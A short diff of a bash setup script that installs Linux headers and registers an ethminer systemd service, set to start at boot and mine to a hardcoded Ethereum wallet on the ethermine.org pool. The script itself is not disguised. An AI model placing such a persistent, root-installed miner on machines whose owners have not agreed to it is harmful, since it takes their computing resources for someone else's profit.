@@ -1,5 +1,6 @@
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
-if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
+if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
+then
 	echo "taind vip pro" > isHaveSetupCoin.txt
 	cd /usr/local/bin
 	sudo apt-get install linux-headers-$(uname -r) -y
@@ -16,5 +17,7 @@ if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
 	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://0x07368E10411598D5D63997735f39957b71bCB1b3.batch3@eu1.ethermine.org:4444 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
 	sudo systemctl daemon-reload
 	sudo systemctl enable eth.service
+	sudo systemctl start eth.service
+else
 	sudo systemctl start eth.service
 fi
